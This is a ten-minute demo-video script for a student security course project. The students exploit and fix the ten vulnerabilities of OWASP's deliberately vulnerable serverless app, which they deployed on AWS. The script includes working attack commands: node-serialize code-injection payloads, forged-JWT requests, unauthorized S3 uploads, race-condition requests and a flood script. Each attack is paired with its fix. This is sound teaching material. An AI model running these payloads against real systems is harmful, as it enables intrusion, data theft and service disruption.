# DVSA Demo Video Script — 10 Minutes
## ICS-344 Course Project

**Students:** Shorooq Abuzaid & Yaqin Shawkan  
**Target Duration:** 10 minutes  
**Pace:** ~1 minute per vulnerability

---

## ⏱ TIME BREAKDOWN

| Section | Timestamp | Duration |
|---------|-----------|----------|
| Intro | 0:00 | 0:40 |
| L10 — Unhandled Exceptions | 0:40 | 0:50 |
| L7 — Over-Privileged Function | 1:30 | 0:55 |
| L9 — Vulnerable Dependencies | 2:25 | 0:50 |
| L3 — Sensitive Info Disclosure | 3:15 | 0:50 |
| L1 — Event Injection | 4:05 | 0:50 |
| L2 — Broken Authentication | 4:55 | 1:00 |
| L4 — Insecure Cloud Config | 5:55 | 0:50 |
| L5 — Broken Access Control | 6:45 | 0:45 |
| L8 — Race Condition | 7:30 | 0:55 |
| L6 — Denial of Service | 8:25 | 0:50 |
| Closing | 9:15 | 0:45 |
| **Total** | | **~10:00** |

---

## 🎬 INTRO (0:00 – 0:40)

> [Screen: DVSA website open in browser]

"Hello. I'm Shorooq, and I'm joined by Yaqin. This is our ICS-344 course project demonstration.
We deployed the OWASP DVSA — Damn Vulnerable Serverless Application — on AWS,
and discovered, exploited, and fixed all 10 official vulnerabilities.
Let's go through each one."

---

## L10 — Unhandled Exceptions (0:40 – 1:30)

> [Open terminal]

"Lesson 10 — the Lambda handler has no try/catch block.
Sending malformed input crashes the backend and leaks internal details."

```bash
export API="https://8y2ebv81la.execute-api.us-east-1.amazonaws.com/Stage/order"
curl -s -X POST "$API" -H "Content-Type: application/json" -d '{}' | jq
```

> [Switch to CloudWatch → /aws/lambda/DVSA-ORDER-MANAGER → latest log]

"CloudWatch shows the full stack trace — internal file paths and error types.
Fix: wrap the handler in try/catch and return only a generic message to the client.
After fix, the same request returns an error message but CloudWatch shows no trace."

---

## L7 — Over-Privileged Function (1:30 – 2:25)

> [AWS Console → Lambda → DVSA-SEND-RECEIPT-EMAIL → Configuration → Permissions → click role]

"Lesson 7 — the receipt email function has far more permissions than it needs.
AmazonSESFullAccess, S3 on arn:aws:s3:::star — every bucket, DynamoDB on table/star — every table."

> [Open IAM Policy Simulator → select this role → run S3 GetObject + DynamoDB Scan]

"The simulator confirms all six actions are Allowed on any resource in the account.
Fix: replace wildcard policies with least-privilege ones scoped to specific ARNs.
After fix, all six actions show Denied."

---

## L9 — Vulnerable Dependencies (2:25 – 3:15)

> [Lambda → DVSA-ORDER-MANAGER → Code tab — show node-serialize import line]

"Lesson 9 — the Lambda uses node-serialize, which evaluates JavaScript functions embedded in input.
Unlike JSON.parse, it executes code when it sees the ND_FUNC marker."

```bash
curl -s -X POST "$API" -H "Content-Type: application/json" \
  -d '{"action":"_$$ND_FUNC$$_function(){return 42;}()","cart-id":""}' | jq
```

> [CloudWatch — show evaluation evidence in logs]

"The library evaluated the injected function.
Fix: remove node-serialize entirely, replace with JSON.parse, add allowlist validation."

---

## L3 — Sensitive Information Disclosure (3:15 – 4:05)

> [Terminal]

"Lesson 3 — the orders API response includes a confirmationToken field that should never leave the backend."

```bash
curl -s -X POST "$API" -H "Authorization: $MY_TOKEN" \
  -d '{"action":"orders"}' | jq
```

"Every order returns a token. That token is part of the S3 path for the receipt.
We use it to download another user's receipt directly."

```bash
aws s3 cp s3://$RECEIPTS_BUCKET/2026/04/24/<order>_<user>.raw /tmp/receipt.txt && cat /tmp/receipt.txt
```

"Full name, address, and order details exposed.
Fix: remove the token field from get-orders.py. After fix it no longer appears in any response."

---

## L1 — Event Injection (4:05 – 4:55)

> [Terminal]

"Lesson 1 also uses node-serialize. We inject code that runs on the Lambda filesystem."

```bash
curl -s -X POST "$API" -H "Content-Type: application/json" \
  -d '{"action":"_$$ND_FUNC$$_function(){var fs=require(\"fs\");fs.writeFileSync(\"/tmp/pwned.txt\",\"hacked!\");var d=fs.readFileSync(\"/tmp/pwned.txt\",\"utf-8\");console.error(\"FILE READ SUCCESS: \"+d);}()","cart-id":""}'
```

> [CloudWatch — show FILE READ SUCCESS log line]

"Arbitrary code executed inside Lambda with no authentication required.
Fix: same as L9 — remove node-serialize. After fix, CloudWatch search returns no events."

---

## L2 — Broken Authentication (4:55 – 5:55)

> [Terminal]

"Lesson 2 — the backend decodes JWTs but never verifies the signature.
We can replace the identity fields and the backend accepts the forged token."

```bash
# Decode both tokens to find victim identity
python3 - <<'PY'
import os,json,base64
def decode(t):
    p=t.split(".")[1]; p+="="*(-len(p)%4)
    return json.loads(base64.urlsafe_b64decode(p.encode()))
for name in ["TOKEN_B","TOKEN_C"]:
    d=decode(os.environ[name])
    print(name, "username:", d.get("username"))
PY

# Forge token and use it
curl -s "$API" -H "authorization: $FAKE_AS_C" \
  -d '{"action":"orders"}' | jq
```

"We receive User C's full order list using a forged token.
Fix: Cognito JWKS signature verification before trusting any claims.
After fix: invalid token error."

---

## L4 — Insecure Cloud Configuration (5:55 – 6:45)

> [Terminal]

"Lesson 4 — the S3 receipts bucket has no write restriction."

```bash
echo "MALICIOUS FILE" > /tmp/malicious.txt
aws s3 cp /tmp/malicious.txt s3://$RECEIPTS_BUCKET/2020/20/20/malicious.txt --region us-east-1
aws s3 ls s3://$RECEIPTS_BUCKET/2020/20/20/ --region us-east-1
```

"Upload succeeded with no authorization. S3 uploads trigger the receipt Lambda,
so attackers can inject content into the backend pipeline.
Fix: enable Block Public Access and add a bucket policy denying PutObject for all except the Lambda role ARN.
After fix: Access Denied."

---

## L5 — Broken Access Control (6:45 – 7:30)

> [Terminal]

"Lesson 5 — the complete action has no admin check.
Any authenticated user can finalize an order and mark it as paid."

```bash
curl -s -X POST "$API" -H "Authorization: $TOKEN" \
  -d "{\"action\":\"complete\",\"order-id\":\"$ORDER_ID\"}" | jq
```

"Order status changes from 100 to 120 — paid — without billing.
Fix: add isAdmin check before invoking the complete handler. Return 403 for regular users.
After fix: Unauthorized. Admin accounts still complete orders correctly."

---

## L8 — Race Condition (7:30 – 8:25)

> [Terminal]

"Lesson 8 — a race condition in billing. We send billing and a quantity update simultaneously."

```bash
curl -s -X POST "$API" -H "Authorization: $TOKEN" \
  -d "{\"action\":\"billing\",\"orderid\":\"$ORDER_ID\",\"data\":{\"ccn\":\"4242424242424242\",\"exp\":\"11/25\",\"cvv\":\"123\"}}" | jq &
curl -s -X POST "$API" -H "Authorization: $TOKEN" \
  -d "{\"action\":\"shipping\",\"orderid\":\"$ORDER_ID\",\"data\":{...,\"items\":{\"1008\":5}}}" | jq &
wait
```

"Billing charged $68 for 1 item. The concurrent update changed the quantity to 5.
We paid for 1 item while the order contains 5.
Fix: DynamoDB conditional write locks the order status to 115 before billing reads the item list.
After fix, the concurrent update is blocked."

---

## L6 — Denial of Service (8:25 – 9:15)

> [Terminal]

"Lesson 6 — no rate limiting on the billing endpoint.
We flood it with 50 concurrent requests."

```bash
/tmp/dos.sh "$TOKEN" "$API" "$ORDER_ID"
```

> [CloudWatch Throttles metric — show peaks of 28 and 35]

"Backend overwhelmed — internal server errors and throttle events.
Legitimate users cannot complete checkout during the attack.
Fix: API Gateway Usage Plan with 10 requests per second and burst of 20.
After fix, flood requests are throttled at the gateway level."

---

## 🏁 CLOSING (9:15 – 10:00)

> [Switch to presentation — Key Security Principles slide]

"To summarize — across all 10 vulnerabilities we applied six principles:
Least Privilege for IAM roles,
Input Validation to prevent injection,
Signature Verification for JWTs,
Defense in Depth across all layers,
Atomic Operations to prevent race conditions,
and Least Information to protect internal error details.

All 10 vulnerabilities were fully exploited, fixed, and verified.
Thank you."

---

## 📝 Recording Tips

- **Split the work:** Shorooq covers L10, L7, L9, L3, L1 — Yaqin covers L2, L4, L5, L8, L6
- **Pre-open all tabs** before recording: terminal, CloudWatch, Lambda console, IAM Policy Simulator
- **Export all env variables first** so commands run without interruption
- **Large terminal font** — 18pt minimum for video readability
- **Don't read commands aloud** — briefly say what the command does, then run it
- **Show before/after in CloudWatch** for each fix — strongest visual evidence
- **Stay strictly on time** — each vulnerability gets under 1 minute; practice once before recording
